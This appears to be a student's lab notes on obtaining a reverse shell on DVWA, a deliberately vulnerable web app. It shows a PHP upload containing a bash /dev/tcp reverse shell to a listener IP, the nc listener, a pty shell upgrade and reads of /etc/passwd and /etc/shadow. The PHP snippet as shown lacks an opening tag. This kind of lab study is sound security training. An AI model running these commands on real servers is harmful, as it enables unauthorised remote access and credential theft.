# Reverse Shell with PHP on DVWA
I wanted to use the default `reverse.php` file for accessing the DVWA server shell in my terminal, but was not able to find one so i created my own `reverse.php`
## Reverse Shell Setup
```bash
nano reverse.php
#then added the content
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'");
```
breakdown of the code:
- **exec**: Executes the command on the server.
- **/bin/bash -c**: Runs the command using Bash.
- **bash -i**: Starts an interactive shell session.
- **>& /dev/tcp/10.0.2.15/4444**: Redirects stdout and stderr to the attacker's IP and port.
- **0>&1**: Redirects stdin to the same source.

## Listener Setup
Before uploading the reverse shell:
```bash
nc -nlvp 4444
```
This listens for incoming connections on port 4444.

##### then i uploaded the `reverse.php` file on DVWA's upload section.
As soon as I accessed it, i saw a shell in my terminal.

## Setting Up Shell
To make the shell more interactive (clearer output, real formatting, command-line behavior), I ran:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")';
```
and then:
```bash
TERM=xterm
```
This makes the shell more terminal like.

## further:-
after doing all this I ran some basic commands like:
- whoami
- hostname
- ls 
- ls -la

the output was:
![Basic commands DVWA shell output](/Day-5-notes/Screenshots/Basic-commands-on-DVWA-shell.png)

opened some files like:
```bash
cat /etc/passwd
cat /etc/shadow
```
- I did not have permission to open shadow file, but in passwd file, it was the same output as we got from LFI inclusion of /etc/passwd.
![reverse shell etc passwd output](/Day-5-notes/Screenshots/etc-passwd-reverse-shell.png)
